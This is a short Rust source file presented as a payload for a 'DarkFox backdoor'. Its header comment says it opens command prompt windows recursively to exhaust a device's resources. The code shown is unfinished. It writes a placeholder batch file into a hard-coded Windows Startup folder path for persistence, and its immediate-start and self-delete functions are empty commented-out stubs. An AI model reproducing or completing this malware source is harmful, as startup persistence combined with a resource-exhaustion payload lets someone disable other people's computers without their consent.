/* Payload for the DarkFox backdoor
 * by: laelaps
 * Opens recursively command prompt windows to kill device's resources 
 */

// Imports

use std::io::Write;

// Change these values and compile to alter the behaviour of the payload

const HOME_DIR: &str = "";

const START_IMMEDIATELY: bool = false;
const ALLOCATE_IN_STARTUP: bool = true;
const DELETE_SELF: bool = false;


const STARTER_FILE_PATH: &str = "C:\\Users\\nufyo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.bat";
const STARTER_FILE_BATCH: &str = "yuyu";

/*
fn get_startup_dir() -> String {
    //get startup
}
*/
fn allocate_in_startup() -> bool {
    let mut starter_file = std::fs::File::create(STARTER_FILE_PATH).expect("failed to create file");
    starter_file.write_all(STARTER_FILE_BATCH.as_bytes()).expect("failed2");
    return true //edit this
}
/*
fn start_now() -> None {
    //start
}
*/
fn main() {
    if ALLOCATE_IN_STARTUP {
        let success: bool = allocate_in_startup();
    }
}
